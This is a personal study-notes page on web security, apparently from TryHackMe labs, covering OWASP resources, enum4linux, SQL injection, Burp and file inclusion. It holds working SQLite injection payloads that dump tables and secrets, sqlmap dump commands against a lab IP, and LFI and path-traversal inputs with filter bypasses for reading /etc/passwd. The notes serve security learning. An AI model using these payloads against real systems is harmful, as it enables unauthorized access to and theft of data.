# R

* Remember for web/general/security

<hr class="sep-both">

## OWASP

* https://owasp.org/www-project-top-ten/
* Juiceshop
* https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
* https://github.com/OWASP/wstg
* https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
* https://github.com/OWASP/CheatSheetSeries
* https://www.zaproxy.org/
* https://github.com/OWASP/Amass

<hr class="sep-both">

## enum4linux

![Usage: Enumerating Information](https://img.shields.io/badge/usage-Enumerating%20Information-ffd700)

I don't know if there is still an `enum.exe`, because I can't find it, but you can use the tool [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) for enumerating information from Windows, and Samba hosts.

```bash
$ ./enum4linux.pl <options> <ip>
# -U : list of users
# -M : list of devices
# -S : list of shares
# -o : os data
# -i : printer data
# -v : verbose
```

<hr class="sep-both">

# Notes

* https://tryhackme.com/resources/blog/online-training-for-careers
* https://tryhackme.com/resources/blog/cyber-security-awareness-month
* There are websites on the Internet that allow you to check the reputation of an IP address to see whether it's malicious or suspicious.
  * AbuseIPDB
  * Cisco Talos Intelligence
  * https://ipinfo.io/
* https://www.virustotal.com/gui/home/upload
* https://www.hybrid-analysis.com/
* https://otx.alienvault.com/ (An open-source threat tracking system)

<hr class="sep-both">

# Learn again

* netdiscover
* https://www.sans.org/cyberaces/

<hr class="sep-both">

# SQL

* Input Box String: usual
* Input Box Non-String: when there is no quotes: `'' OR 1=1-- -`
* If you have trouble via a form (client-side verification) intercept the request
* Look into the field name to guess column names
* Update
  * none',nickName='lol
* Version
  * (SELECT banner FROM v$version)
  * sqlite_version()
    * SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
    * ',nickName=(SELECT group_concat(tbl_name, '<br>') FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
    * ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
    * ',nickName=(SELECT group_concat(id || ":" || author || ":" || secret, '<br>') FROM secrets),email='
* https://www.kirsle.net/wizards/flask-session.cgi
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
* sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin"
  --level=5 --risk=3 --dbms=sqlite --technique=b --dump
* sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump --threads 10
* https://tryhackme.com/room/sqlilab
* See tamper script

<hr class="sep-both">

## Burp

* take a request captured in the Proxy, edit it, and send the same request repeatedly as many times as we wish
* tabs per request

<hr class="sep-both">

# weeb

* https://www.base64decode.org/
* https://www.base64encode.org/
* IDOR: if accounts are unpredictable, try making two accounts, and test if you can swap with both.
* URL/source code, scripts (see network tab)...
* https://canitakeyoursubdomain.name/
* https://secalerts.co/
* https://stack.watch/
* File inclusion
  * Local File Inclusion (LFI)
    * someone make a require/import of something fetched by the user, such as LANG (ex with `$_GET["lang"]`)
    * if there are error messages, it's easy to get the path good
    * Null Byte (< PHP 5.3.4, expecting EN -> EN.php, then "EN%00" or "EN0x00" ignore the ".php")
    * `/etc/passwd%00` (bypass simple filters)
    * `....//` (bypass filter with `../` as PHP will not replace the output)
    * it's also possible that the dev force the files to be in a folder, but we simply need to make a path starting with this folder then
  * Remote File Inclusion (RFI)
  * Path/Directory traversal: manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory
    * file_get_contents in PHP
    * ../[...]/etc/passwd (dot-dot-slash attack)
    * ../[...]/windows/win.ini
    * It may be worth noting that the root, it its own parent, so if you don't know the path of the server, you can still get add way more "../" than needed, and add a path starting from the root.
    * https://tryhackme.com/room/fileinc (common files)